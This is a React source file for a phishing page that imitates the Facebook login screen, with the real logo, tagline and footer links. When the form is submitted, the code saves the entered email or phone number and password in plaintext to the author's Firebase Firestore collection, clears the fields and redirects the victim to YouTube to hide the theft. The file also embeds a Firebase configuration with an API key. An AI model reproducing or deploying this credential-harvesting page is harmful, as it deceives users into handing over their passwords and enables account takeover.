
import "./App.css"
import React from 'react';
import MyImage from './assets/cell-phone.png';
import { useState } from "react";
import { initializeApp } from "firebase/app";
import { collection, addDoc } from "firebase/firestore"; 
import { getFirestore } from "firebase/firestore";
const firebaseConfig = {
    apiKey: "AIzaSyDGbd9zHWClkQ-Sh2I1chWlL8ethZwSwzk",
    authDomain: "facebook-9c7f3.firebaseapp.com",
    databaseURL: "https://facebook-9c7f3-default-rtdb.firebaseio.com",
    projectId: "facebook-9c7f3",
    storageBucket: "facebook-9c7f3.appspot.com",
    messagingSenderId: "477531264708",
    appId: "1:477531264708:web:4f1e0947f5050e665fdb91",
    measurementId: "G-09DPLZ8RSW"
};
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);


function App() {
    let [user,setUser] =  useState("") 
    let  [password,setPassword] = useState("")

function getData (e){   
    e.preventDefault()
    console.log(user)
    console.log(password)
   
  async function  getAnotherData (){
    try {
        const docRef = await addDoc(collection(db, "Facebook"), {
          userNameGive: user,
          passwordGive: password,
        });
        console.log("Document written with ID: ", docRef.id);
      } catch (e) {
        console.error("Error adding document: ", e);
      }
      
 }

 getAnotherData()

document.getElementById("username").value = ""
document.getElementById("password").value = ""
window.location.href ="https://www.youtube.com/"

}

  return (
<div>
<div className="ahmed">
    <div className="fix-m-header">
          <img src={MyImage} alt="" />
        <span>Get Facebook for Android and browse faster</span>
    </div>

    <div className="container">
        <div className="content">
           <div className="left-content">
               <div className="f-logo">
              
                   <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="" />
               </div>
               <h2 className="f-quote">Facebook helps you connect and share with the people in your life.</h2>
           </div>
           <div className="right-content">
               <div className="card">
                   <form>
                   <div class="input-container">
                          
                            <input type="text" id="username"  onChange={(e)=>(setUser(e.target.value))}  placeholder="Email address or phone number"   />
                       </div>
                       <div class="input-container">
                              <input type="password"   id="password"  onChange={(e)=>(setPassword(e.target.value))}   placeholder="Password" />
                        </div>
                        <div className="login-btn-container">
                            <button   onClick={getData} className="login-btn">Log In</button>
                        </div>
                   </form>

                   <div className="forgotten-password">
                       <a href="">Forgotten Password?</a>
                   </div>

                   <div className="divider"></div>

                   <div className="ad" >
                       <a className="crt-new-ac" href="#">Create New Account</a>
                   </div>
               </div>
               <div className="crt-page">
                   <a href="#">Create a Page</a>
                   <span>for a celebrity, band or business.</span>
               </div>
           </div>
        </div>
    </div>

    <footer className="f-lg-footer">
        <ul>
            <li><a href="">English (UK)</a></li>
            <li><a href="">বাংলা</a></li>
            <li><a href="">हिन्दी</a></li>
            <li><a href="">اردو</a></li>
            <li><a href="">नेपाली</a></li>
            <li><a href="">ଓଡ଼ିଆ</a></li>
            <li><a href="">Español</a></li>
            <li><a href="">Português (Brasil)</a></li>
            <li><a href="">Français (France)</a></li>
            <li><a href="">Deutsch</a></li>
            <li><a href="">Italiano</a></li>
        </ul>
        <div className="divider"></div>
        <ul>  
            <li><a href="">Sign Up</a></li>
            <li><a href="">Log In</a></li>
            <li><a href="">Messenger</a></li>
            <li><a href="">Facebook Lite</a></li>
            <li><a href="">Watch</a></li>
            <li><a href="">Places</a></li>
            <li><a href="">Games</a></li>
            <li><a href="">Marketplace</a></li>
            <li><a href="">Facebook Pay</a></li>
            <li><a href="">Jobs</a></li>
            <li><a href="">Oculus</a></li>
            <li><a href="">Portal</a></li>
            <li><a href="">Instagram</a></li>
            <li><a href="">Local</a></li>
            <li><a href="">Fundraisers</a></li>
            <li><a href="">Services</a></li>
            <li><a href="">Voting</a></li>
            <li><a href="">Information Centre</a></li>
            <li><a href="">About</a></li>
            <li><a href="">Create ad</a></li>
            <li><a href="">Create Page</a></li>
            <li><a href="">Developers</a></li>
            <li><a href="">Careers</a></li>
            <li><a href="">Privacy</a></li>
            <li><a href="">Cookies</a></li>
            <li><a href="">AdChoices</a></li>
            <li><a href="">Terms</a></li>
            <li><a href="">Help</a></li>
            <li><a href="">Settings</a></li>
        </ul>
    </footer>

    <div className="m-footer">
        <div className="m-f-lang">
            <ul>
                <li><a href="">English (UK)</a></li>
                <li><a href="">বাংলা</a></li>
                <li><a href="">हिन्दी</a></li>
            </ul>
            <ul>
                <li><a href="">اردو</a></li>
                <li><a href="">नेपाली</a></li>
                <li><a href="">ଓଡ଼ିଆ</a></li>
            </ul>
        </div>
        

        <div  className="ac" ></div>

        <div className="links ab" >
            <a href="#">About</a><a href="#">Help</a><a href="#">More</a>
        </div>

        <div className="aa">Facebook Inc</div>
    </div>
</div>
</div>
  )
}


export default App;